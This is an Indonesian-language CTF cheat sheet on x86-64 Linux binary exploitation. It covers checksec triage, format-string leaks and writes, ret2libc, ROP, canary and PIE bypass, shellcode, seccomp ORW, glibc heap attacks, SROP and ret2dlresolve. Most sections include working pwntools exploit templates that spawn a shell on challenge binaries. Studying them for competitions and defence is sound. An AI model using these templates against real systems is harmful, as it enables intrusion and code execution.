# PWN — Binary Exploitation ⭐

> Area prioritas. Dari dasar → lanjut. Tiap teknik: *kapan dipakai → caranya → template*. Arsitektur default di sini x86-64 Linux.

## Daftar isi cepat
Triage · Offset · ret2win · **Format string** · ret2libc · ROP lanjut · Canary/PIE · Shellcode · Syscall/ORW · **Heap** · seccomp · SROP · Stack pivot · ret2dlresolve · pwntools · GDB · Checklist

---

## Triage (lakuin tiap soal)
```bash
file ./chall              # arsitektur, statis/dinamis, stripped?
checksec --file=./chall   # proteksi (tabel bawah)
strings ./chall | less    # /bin/sh, flag, format string, "system"
./chall                   # jalanin, liat input
nm ./chall | grep -i -E 'win|flag|system|shell'   # fungsi menarik
```
Kalau dikasih **libc.so.6 + ld**: jalanin pakai libc soal biar offset cocok:
```bash
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --replace-needed libc.so.6 ./libc.so.6 ./chall
# atau di pwntools: p = process([...], env={}) ; ELF('./libc.so.6')
```

### Baca checksec → pilih teknik
| Proteksi | ON artinya | Lawannya |
|----------|-----------|----------|
| **NX / DEP** | stack gak executable | ret2libc / ROP (bukan shellcode) |
| **Canary** | ada stack guard | leak canary dulu (fmtstr / overread), baru overflow |
| **PIE** | base alamat kode acak | leak alamat biner dulu |
| **Full RELRO** | GOT read-only | GOT overwrite gak bisa → cari teknik lain |
| **Partial/No RELRO** | GOT writable | **GOT overwrite** bisa |
| **ASLR** (OS) | libc/stack/heap acak | leak alamat dulu (runtime) |

Kalau **NX off** → bisa shellcode di stack. Kalau **statis** (no libc) → ROP pakai gadget biner / ret2dlresolve / syscall langsung.

---

## 1. Cari offset ke RIP
```bash
python3 -c "from pwn import *; print(cyclic(200).decode())"
# crash di gdb → ambil nilai di RSP / pola → :
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```
Di pwndbg otomatis: `cyclic 200` lalu `cyclic -l $rsp` abis crash.
Rumus klasik: `offset = ukuran_buffer + 8 (saved RBP)` → byte berikutnya nimpa RIP.

---

## 2. ret2win (ctrl-hijack dasar)
**Kapan:** ada fungsi "win/flag/system" yang gak kepanggil.
```python
from pwn import *
e = ELF('./chall'); p = process('./chall')
payload  = b'A'*offset
payload += p64(e.sym['win'])
p.sendline(payload); p.interactive()
```
**Gotcha `movaps`:** segfault di `movaps xmm..,[rsp]` → stack gak 16-byte aligned → sisipin 1 gadget `ret` sebelum alamat tujuan:
```python
ret = ROP(e).find_gadget(['ret'])[0]
payload = b'A'*offset + p64(ret) + p64(e.sym['win'])
```
**Butuh argumen** (mis. `win(0xdeadbeef)`): pakai `pop rdi; ret`:
```python
payload = b'A'*offset + p64(pop_rdi) + p64(0xdeadbeef) + p64(e.sym['win'])
```

---

## 3. Format String ⭐ (gap utama — pelajarin serius)
**Gejala:** `printf(user_input)` tanpa format → kamu kendaliin format string.

### 3a. Cari offset argumen kita
Kirim `AAAABBBB.%p.%p.%p.%p...` → cari slot yang nampilin `0x41414141...`. Atau pakai langsung `%N$p`.
```python
for i in range(1, 30):
    p = process('./chall'); p.sendline(f'AAAA.%{i}$p'.encode())
    print(i, p.recvline())
```

### 3b. Leak (bocorin stack / libc / canary / PIE)
```python
p.sendline(b'%p ' * 30)        # bocorin 30 slot stack
p.sendline(b'%7$p')            # slot ke-7 langsung
```
- **Canary**: nilai 8-byte diakhiri `00`, posisinya di atas buffer (sering slot ke- tertentu). Simpen buat dipasang lagi di payload overflow.
- **libc leak**: bocorin alamat `__libc_start_main+offset` / return address di stack → `libc.address = leak - known_offset`.
- **PIE leak**: bocorin alamat kode → `e.address = leak - offset_fungsi`.

### 3c. Arbitrary write (`%n`)
`%n` = nulis jumlah byte yang udah dicetak ke alamat yang ditunjuk pointer di stack.
```python
from pwn import *
# cara otomatis (paling gampang, bener-bener dipelajarin manualnya juga):
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```
Manual: `%<angka>c` cetak sejumlah char → `%<pos>$n` tulis ke alamat di slot `pos`.
Pakai `%hn` (2 byte) / `%hhn` (1 byte) biar gak perlu cetak milyaran char — tulis per potongan.

**Target write favorit:** GOT entry (`printf@got` → `system`), return address, `__malloc_hook`/`__free_hook` (libc < 2.34), `exit` handlers.

**Pola klasik:** overwrite `printf@got` → `system`, lalu input berikutnya `/bin/sh` → `printf("/bin/sh")` jadi `system("/bin/sh")`.

---

## 4. ret2libc / bypass NX ⭐
**Kapan:** NX on, gak ada win, ada overflow → panggil `system("/bin/sh")` dari libc.
```python
from pwn import *
e = ELF('./chall'); libc = ELF('./libc.so.6'); p = process('./chall')
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]; ret = rop.find_gadget(['ret'])[0]

# TAHAP 1: leak libc via puts(puts@got), balik ke main
payload  = b'A'*offset + p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.sym['main'])
p.sendlineafter(b'prompt', payload)
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']; log.success(hex(libc.address))

# TAHAP 2: system("/bin/sh")
binsh = next(libc.search(b'/bin/sh\x00'))
payload = b'A'*offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
p.sendlineafter(b'prompt', payload); p.interactive()
```
**Dapet libc bener:** offset leak → `libc-database/find puts <3 digit terakhir>` atau https://libc.rip.
**Shortcut one_gadget:** `one_gadget ./libc.so.6` → alamat yang langsung execve("/bin/sh"); cek constraint (mis. `[rsp+0x40]==NULL`).
```python
payload = b'A'*offset + p64(libc.address + one_gadget_offset)
```

---

## 5. ROP chain lanjut
Argumen x86-64: **rdi, rsi, rdx, rcx, r8, r9** (lalu stack).
```bash
ROPgadget --binary ./chall | grep -E 'pop rdi|pop rsi|pop rdx|syscall|leave|ret'
ropper --file ./chall --search 'pop rdi'
```
- **pwntools ROP() auto-chain**:
  ```python
  rop = ROP([e, libc])
  rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
  payload = b'A'*offset + rop.chain()
  ```
- **ret2csu**: gadget terbatas → pakai `__libc_csu_init` buat kontrol rdi/rsi/rdx (ada `pop rbx/rbp/r12-r15; ret` + `mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]`).
- **GOT overwrite** (Partial RELRO): tulis `system` ke GOT fungsi yang kepanggil lagi.

---

## 6. Bypass Canary & PIE
- **Canary:** leak dulu (fmtstr / buffer over-read / off-by-one yang bocorin) → pasang nilai canary di payload **tepat sebelum saved RBP**:
  ```python
  payload = b'A'*offset_to_canary + p64(canary) + p64(saved_rbp) + rop
  ```
  Fork server: canary sama tiap fork → bisa brute byte-per-byte (256*8 percobaan).
- **PIE:** leak alamat kode (fmtstr / bocor return addr) → `e.address = leak - offset`. Baru `e.sym[...]`/gadget valid.
- Soal 450-500 poin biasanya **gabungan**: leak canary + PIE/libc → ROP. Itu sebabnya mahal.

---

## 7. Shellcode (NX off / RWX region)
```python
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())            # execve("/bin/sh")
# kalau buffer di stack & alamatnya kebocor/known:
payload = sc.ljust(offset, b'\x90') + p64(stack_addr)
```
- Buffer kecil → shellcode pendek / egg-hunter / two-stage (`read` lagi).
- ASLR + stack exec → butuh leak alamat stack dulu, atau `jmp rsp` gadget.
- Shellcode ONLY read file (kalau execve diblok seccomp) → lihat ORW bawah.

---

## 8. Syscall langsung & ORW (open-read-write)
Kalau `system`/`execve` diblok (seccomp), baca flag langsung: **open → read → write**.
```python
# syscall numbers x86-64: read=0, write=1, open=2, openat=257, exit=60, execve=59
# shellcraft ORW:
sc = shellcraft.open('/flag') + shellcraft.read('rax','rsp',100) + shellcraft.write(1,'rsp',100)
payload = asm(sc)
```
ROP ORW (tanpa shellcode): chain `open(path,0)` → `read(fd, buf, n)` → `write(1, buf, n)` pakai `pop rdi/rsi/rdx; syscall`. Simpen string `"/flag"` di bss via `read`.

---

## 9. Heap exploitation (glibc)
**Kenali:** ada menu malloc/free/edit/show (note app). Cek versi glibc (nentuin mitigasi tcache).
```
tcache (glibc >=2.26): LIFO per-size, 7 chunk. Cek: double-free, tcache poisoning.
```
### Bug & teknik umum
- **UAF (use-after-free)**: free lalu masih bisa baca/tulis → leak heap/libc, atau tulis fd.
- **Double free**: free 2x → tcache poisoning → alokasi ke alamat arbitrer.
  ```
  free(a); free(a);  (glibc<2.29 tanpa cek)  -> malloc; malloc balik a; tulis target ke fd
  ```
- **tcache poisoning**: overwrite `fd` chunk bebas → `malloc` balikin alamat yang kamu mau (mis. `__free_hook`, GOT).
  > glibc >=2.32: `fd` di-mangle (`fd ^ (addr>>12)`) → butuh leak heap base buat hitung.
- **Heap overflow**: tulis melewati chunk → timpa size/metadata chunk sebelahnya.
- **tcache/fastbin dup**, **unsorted bin leak** (chunk bebas gede → `fd/bk` nunjuk main_arena → libc leak).
- **House of ...** (Force, Orange, Einherjar) buat kasus lanjut.
### Target write
- glibc < 2.34: `__free_hook`/`__malloc_hook` → `system`/one_gadget.
- glibc >= 2.34 (hook dihapus): `__exit_funcs` (encrypted via PTR_MANGLE), `_IO_2_1_stdout_` (FSOP), `stdout` file struct → `House of Apple 2`.
### Leak libc dari heap
- Alokasi chunk gede (>0x420) → free → masuk unsorted bin → `fd` nunjuk `main_arena+96` → `libc.address = leak - offset_main_arena`.
```python
# pola note-app pwntools
def add(i,sz,data): ...   # menu wrapper
def free(i): ...
def show(i): ...
```

---

## 10. seccomp (filter syscall)
```bash
seccomp-tools dump ./chall      # liat syscall yang diizinin/dilarang
```
- `execve` diblok → pakai **ORW** (open/read/write) atau `openat`.
- Diblok juga `open`? → `openat`, atau baca via `sendfile`.

---

## 11. SROP (sigreturn-oriented)
**Kapan:** gadget super minim tapi ada `syscall; ret` + bisa set rax=15 (`sigreturn`). Bikin fake sigcontext frame buat kontrol semua register.
```python
from pwn import *
context.arch='amd64'
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh; frame.rip = syscall_ret
payload = b'A'*offset + p64(pop_rax_15) + p64(syscall_ret) + bytes(frame)
```

---

## 12. Stack pivot
**Kapan:** overflow pendek (gak muat chain panjang). Pindahin RSP ke area yang kamu kontrol (bss/heap).
- Gadget: `leave; ret` (RSP←RBP), `pop rsp; ret`, `xchg rax,rsp`.
- Taruh chain di bss via `read`, set RBP ke bss-8, `leave;ret`.

---

## 13. ret2dlresolve (statis / no leak)
**Kapan:** gak ada leak libc & gak ada `system` di biner (sering Partial RELRO, no PIE). Paksa `_dl_runtime_resolve` resolve `system`.
```python
from pwn import *
e = ELF('./chall')
dl = Ret2dlresolvePayload(e, symbol='system', args=['/bin/sh'])
rop = ROP(e); rop.read(0, dl.data_addr); rop.ret2dlresolve(dl)
payload = b'A'*offset + rop.chain() + dl.payload
```

---

## pwntools cheatsheet
```python
from pwn import *
context.binary = './chall'                 # auto arch/bits/endian
context.log_level = 'debug'                # liat byte kirim/terima
# target:
p = process('./chall')                     # local
p = remote('host', 1337)                   # remote
p = gdb.debug('./chall', 'b main\nc')      # local + gdb
# IO:
p.recvuntil(b'xx'); p.recvline(); p.recvn(8); p.recvall()
p.send(b'..'); p.sendline(b'..'); p.sendafter(b'xx', b'..'); p.sendlineafter(b'xx', b'..')
# pack/unpack:
p64(0xdead); u64(data.ljust(8,b'\x00')); p32(x); u32(x); flat(b'A'*40, p64(addr))
# ELF/ROP/libc:
e=ELF('./chall'); e.sym['main']; e.got['puts']; e.plt['puts']; e.search(b'/bin/sh')
rop=ROP(e); rop.find_gadget(['pop rdi','ret'])[0]; rop.call('system',[arg]); rop.chain()
libc=ELF('./libc.so.6'); libc.address=leak-libc.sym['puts']; libc.sym['system']
# cyclic:
cyclic(200); cyclic_find(0x6161616c)
p.interactive()
```
Debug attach: `gdb.attach(p, 'b *main+123')`. Env bersih: `process('./chall', env={})`.

## GDB / pwndbg cheatsheet
```
b *main+0x40 / b *0x401234     breakpoint
r / c / ni / si                run / continue / step
x/20xg $rsp                    dump 20 qword di stack
x/8i $rip                      8 instruksi di rip
p $rax / p/x $rdi              register
vmmap                          peta memori (cari base libc/heap/stack)
telescope $rsp 20              (pwndbg) stack ter-resolve
got / plt                      tabel GOT/PLT
canary                         (pwndbg) cari nilai canary
search -s "/bin/sh"            cari string
heap / bins / tcachebins       (pwndbg) kondisi heap
find_gadget / rop              gadget
set {int}0x... = 1             patch memori live
```

## Checklist kalau stuck
- [ ] Udah `checksec`? Proteksi mana yang harus dilawan?
- [ ] Offset ke RIP bener? (cyclic)
- [ ] Alignment `movaps`? (+`ret`)
- [ ] libc versi bener? (leak → libc.rip / libc-database)
- [ ] Ada fmtstr buat leak canary/PIE?
- [ ] Coba `one_gadget` (cek constraint).
- [ ] seccomp aktif? (`seccomp-tools dump` → ORW)
- [ ] Statis / no leak → ret2dlresolve.
- [ ] Menu malloc/free → ini heap (UAF/double-free/tcache).
- [ ] Baca ulang disassembly — ada cek/konstanta tersembunyi (kayak int / Kok Ga Bisaaa)?
